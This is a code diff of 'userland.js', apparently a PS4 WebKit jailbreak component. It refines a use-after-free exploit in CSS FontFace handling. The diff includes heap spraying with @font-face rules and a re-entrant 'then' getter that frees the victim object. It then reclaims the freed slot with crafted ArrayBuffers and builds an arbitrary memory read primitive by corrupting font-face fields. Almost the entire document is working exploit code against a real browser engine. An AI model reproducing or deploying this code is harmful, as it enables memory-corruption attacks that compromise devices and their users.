@@ -1,99 +1,182 @@
-// userland.js — UAF trigger + read primitive (WebKit confirmation only)
+// userland.js — UAF trigger + read primitive (memory-safe for PS4 browser)
 
-//#region State
-const mem = {
-  allocs: new Set(),
-  alloc(len, ptr = true) {
-    const ab = new ArrayBuffer(len);
-    this.allocs.add(ab);
-    return ptr ? ab.data() : ab;
-  },
-  free(ab) { return this.allocs.delete(ab); },
-};
-//#endregion
+const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024; // conservative PS4 renderer budget
 
-//#region init_rw — UAF + reclaim + read primitive
-async function init_rw() {
-  logger.info("Initiate UAF...");
+// ─── Memory helpers ──────────────────────────────────────
+function memUsage() {
+  // Chrome/WebKit expose performance.memory; PS4 may or may not.
+  if (performance && performance.memory) {
+    return {
+      used: performance.memory.usedJSHeapSize,
+      total: performance.memory.totalJSHeapSize,
+      limit: performance.memory.jsHeapSizeLimit,
+    };
+  }
+  return null;
+}
 
-  const spray_count = 0xb0;
-  const spray_font_rule = `
-    @font-face {
-      font-family: spray;
-      src: local(Helvetica Bold);
-      unicode-range: U+0043;
-    }
-  `;
-  const uaf_font_rule = `
-    @font-face {
-      font-family: b;
-      src: url(nonexistent-font.woff);
-      unicode-range: U+0042;
-    }
-  `;
+function memLog(label) {
+  const m = memUsage();
+  if (m) {
+    const usedMB = (m.used / 1048576).toFixed(2);
+    const totalMB = (m.total / 1048576).toFixed(2);
+    logger.debug(`[mem:${label}] used=${usedMB}MB total=${totalMB}MB`);
+  } else {
+    logger.debug(`[mem:${label}] (no performance.memory on this build)`);
+  }
+}
 
-  const abs = new Array(spray_count);
+function assertMemoryHeadroom(extraBytes, stage) {
+  const m = memUsage();
+  if (!m) return; // can't check, proceed
+  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
+    throw new Error(
+      `OOM guard at ${stage}: ` +
+      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
+      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
+      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
+    );
+  }
+}
 
-  // FontFace A — resolves synchronously
+// ─── Embedded tiny font source (avoids font enumeration) ─
+// A minimal data URL that WebKit accepts as a font source without
+// triggering local font enumeration or network fetches.
+const TINY_FONT_SRC =
+  "url(data:font/woff2;base64," +
+  "d09GMgABAAAAAAAgAA8AAAAAADwAAQAAAAAAAAAAAAAAAAAAAAAAAAAABmAAgmQqBAgEEQgKiBSFAgE2AiQDgkQBCAqBFgEIBAAhEAA=" +
+  ")";
+
+// ─── init_rw ─────────────────────────────────────────────
+async function init_rw(opts = {}) {
+  // Tuneable; defaults chosen for PS4 memory budget
+  const sprayCount = opts.sprayCount ?? 0x10; // 16, was 176
+  const verbose    = opts.verbose ?? true;
+
+  logger.info(`Initiate UAF (sprayCount=${sprayCount})...`);
+  memLog("start");
+
+  // ── Precompute rule strings ──
+  const sprayRule =
+    `@font-face{font-family:spray;src:${TINY_FONT_SRC};unicode-range:U+0043}`;
+  const uafRule =
+    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;
+
+  // ── Create the two FontFace objects ──
+  // A: resolves synchronously (local source)
   const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
   document.fonts.add(A);
   void A.loaded;
 
+  // Style element (single, reused)
   const style = document.createElement("style");
   document.head.appendChild(style);
 
-  // Heap-shape around B
-  for (let i = 0; i < spray_count / 4; i++) {
-    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+  // ── Spray rules BEFORE the victim (heap shaping) ──
+  const halfSpray = Math.floor(sprayCount / 2);
+  for (let i = 0; i < halfSpray; i++) {
+    try {
+      style.sheet.insertRule(sprayRule, style.sheet.cssRules.length);
+    } catch (e) {
+      throw new Error(`insertRule (pre) failed at ${i}: ${e.message}`);
+    }
   }
 
-  // FontFace B — resolves asynchronously (this is the victim)
-  const uaf_font_rule_index = style.sheet.cssRules.length;
-  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
-
-  for (let i = spray_count / 4; i < spray_count; i++) {
-    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+  // ── Victim rule ──
+  const uafRuleIndex = style.sheet.cssRules.length;
+  try {
+    style.sheet.insertRule(uafRule, style.sheet.cssRules.length);
+  } catch (e) {
+    throw new Error(`insertRule (victim) failed: ${e.message}`);
   }
 
-  // Force style recalculation
-  document.body.offsetTop;
+  // ── Spray rules AFTER the victim ──
+  for (let i = halfSpray; i < sprayCount; i++) {
+    try {
+      style.sheet.insertRule(sprayRule, style.sheet.cssRules.length);
+    } catch (e) {
+      throw new Error(`insertRule (post) failed at ${i}: ${e.message}`);
+    }
+  }
 
-  const old_then = FontFace.prototype.then;
+  memLog("after-insertRule");
+
+  // ── Force one layout recalculation ──
+  // Using a single read so WebKit can't coalesce it away, but only once.
+  void document.body.offsetTop;
+
+  // ── Prepare ArrayBuffer slot array ──
+  const abs = new Array(sprayCount);
+  const abSize = constants.wk_CSSFontFace_sizeof;
+
+  // Pre-flight memory check
+  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");
+
+  // ── Install the re-entrant `then` getter ──
+  const oldThen = FontFace.prototype.then;
+
+  let getterFired = false;
+  let getterError = null;
 
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
-      if (this === A) {
-        // Free B while FontFaceSet::load holds a raw reference
-        style.sheet.deleteRule(uaf_font_rule_index);
-        document.body.offsetTop;
+      if (this === A && !getterFired) {
+        getterFired = true;
 
-        // Free B's neighbours
-        for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
-          const rule = style.sheet.cssRules[i];
-          if (rule.cssText.includes("spray")) {
-            style.sheet.deleteRule(i);
-          }
-        }
+        try {
+          // 1. Free the victim's rule while load() holds a ref
+          style.sheet.deleteRule(uafRuleIndex);
 
-        document.body.offsetTop;
-
-        // Spray with CSSFontFace-sized ArrayBuffers
-        for (let i = 0; i < abs.length; i++) {
-          const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
-          const view = new DataView(ab);
-
-          view.setBInt(8, 1, true);                            // refcount
-          view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Success
-
-          // Pre-seed the Variant tag on 13.x
-          if (version.major >= 13) {
-            const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
-            view.setUint8(tag_off, 1);
-            for (let j = 1; j < 8; j++) view.setUint8(tag_off + j, 0);
+          // 2. Free the victim's neighbours
+          for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
+            const rule = style.sheet.cssRules[i];
+            if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
+              style.sheet.deleteRule(i);
+            }
           }
 
-          abs[i] = ab;
+          // 3. Force deconstruction of the freed CSSFontFace objects
+          void document.body.offsetTop;
+
+          // 4. Detach the style element entirely — releases remaining CSSOM
+          try { style.remove(); } catch (_) {}
+          try { document.head.removeChild(style); } catch (_) {}
+
+          // 5. Spray ArrayBuffers to reclaim the freed slot
+          let allocated = 0;
+          for (let i = 0; i < abs.length; i++) {
+            try {
+              const ab = new ArrayBuffer(abSize);
+              const view = new DataView(ab);
+
+              view.setBInt(8, 1, true);                              // refcount
+              view.setUint8(constants.wk_CSSFontFace_m_status, 3);   // Success
+
+              if (version.major >= 13) {
+                const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
+                view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
+                for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
+              }
+
+              abs[i] = ab;
+              allocated++;
+            } catch (e) {
+              // Out of memory partway through — record and stop
+              getterError = `ArrayBuffer alloc failed at ${i}/${abs.length}: ${e.message}`;
+              logger.error(getterError);
+              break;
+            }
+          }
+
+          if (verbose) {
+            logger.debug(`[getter] allocated ${allocated}/${abs.length} ArrayBuffers`);
+          }
+          memLog("after-spray");
+
+        } catch (e) {
+          getterError = e.message;
+          logger.error(`[getter] error: ${e.message}`);
         }
       }
 
@@ -101,65 +184,101 @@ async function init_rw() {
     },
   });
 
-  // Loading 'AB' needs U+0041 (from A) and U+0042 (from B)
-  const fonts = await document.fonts.load("1em a, b", "AB");
-  logger.debug(`fonts: ${fonts}`);
+  // ── Trigger the UAF ──
+  logger.debug("Triggering document.fonts.load('1em a, b', 'AB')...");
+  let fonts;
+  try {
+    fonts = await document.fonts.load("1em a, b", "AB");
+  } catch (e) {
+    // Restore prototype before rethrowing
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      value: oldThen,
+    });
+    throw new Error(`document.fonts.load threw: ${e.message}`);
+  }
 
+  // ── Restore prototype ASAP ──
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
-    value: old_then,
+    value: oldThen,
   });
 
+  logger.debug(`fonts.length = ${fonts.length}`);
+  memLog("after-load");
+
+  // ── Report the getter error if it fired ──
+  if (getterError) {
+    throw new Error(`UAF getter failed: ${getterError}`);
+  }
+
+  if (!getterFired) {
+    throw new Error("UAF getter never fired (A did not resolve first)");
+  }
+
   if (fonts.length !== 2) {
-    throw new Error("Unable to reclaim UAF FontFace !!");
+    throw new Error(
+      `Unable to reclaim UAF FontFace (fonts.length=${fonts.length})`
+    );
   }
 
   logger.info("UAF Achieved !!");
 
-  let uaf_ab = undefined;
-  let uaf_font = undefined;
-
-  for (const font of fonts) {
-    if (font.unicodeRange === "U+0-10FFFF") {
-      logger.info("Found UAF FontFace !!");
-      uaf_font = font;
+  // ── Find the UAF FontFace ──
+  let uaf_font = null;
+  for (const f of fonts) {
+    if (f.unicodeRange === "U+0-10FFFF") {
+      uaf_font = f;
       break;
     }
   }
-
-  if (uaf_font === undefined) {
+  if (!uaf_font) {
     throw new Error("Unable to find UAF FontFace !!");
   }
+  logger.info("Found UAF FontFace !!");
 
-  fonts.length = 0;
-
-  // Find the ArrayBuffer with refcount 2 (it's aliased by the FontFace)
-  for (const ab of abs) {
-    const view = new DataView(ab);
-    if (view.getBInt(8, true).eq(2)) {
-      logger.info("Found ArrayBuffer of UAF FontFace !!");
-      uaf_ab = ab;
-      break;
-    }
+  // ── Find the aliased ArrayBuffer (refcount 2) ──
+  let uaf_ab = null;
+  let uaf_ab_index = -1;
+  for (let i = 0; i < abs.length; i++) {
+    const ab = abs[i];
+    if (!ab) continue;
+    try {
+      const v = new DataView(ab);
+      if (v.getBInt(8, true).eq(2)) {
+        uaf_ab = ab;
+        uaf_ab_index = i;
+        break;
+      }
+    } catch (_) { /* skip */ }
   }
-
-  if (uaf_ab === undefined) {
+  if (!uaf_ab) {
     throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
   }
+  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);
 
+  // ── Free every ArrayBuffer we don't need ──
+  // Drop references so the GC can reclaim them before the read stage.
+  for (let i = 0; i < abs.length; i++) {
+    if (i !== uaf_ab_index) abs[i] = null;
+  }
   abs.length = 0;
 
+  // Also release the load-result array
+  fonts.length = 0;
+
+  // Clear any FontFaceSet entries we added that aren't the UAF victim
+  try {
+    document.fonts.delete(A);
+  } catch (_) { /* ignore */ }
+
+  memLog("after-reclaim");
+
+  // ── Assemble the read primitive ──
   const self = {
     uaf_ab,
     uaf_font,
 
-    // ─────────────────────────────────────────────────────────────
-    // read() — 4 bytes at a time through featureSettings
-    //
-    // On FW >= 13, we corrupt the Variant at +0x10 to select the
-    // StyleRuleFontFace branch and point it at the read target.
-    // On FW < 13, we use the legacy m_featureSettings path.
-    // ─────────────────────────────────────────────────────────────
     read(addr, size) {
       const ab = new ArrayBuffer(size);
       const u8 = new Uint8Array(ab);
@@ -179,9 +298,12 @@ async function init_rw() {
           for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
           uaf_view.setBInt(pay_off, ptr, true);
         } else {
-          uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
-          uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
-          uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
+          uaf_view.setBInt(
+            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
+          uaf_view.setInt32(
+            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
+          uaf_view.setInt32(
+            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
         }
 
         let chunk = "";
@@ -210,8 +332,14 @@ async function init_rw() {
       const ab = self.read(addr, 8);
       return new DataView(ab).getBInt(0, true);
     },
+
+    cleanup() {
+      try { document.fonts.clear(); } catch (_) {}
+      try { style.remove(); } catch (_) {}
+      self.uaf_ab = null;
+      self.uaf_font = null;
+    },
   };
 
   return self;
 }
-//#endregion
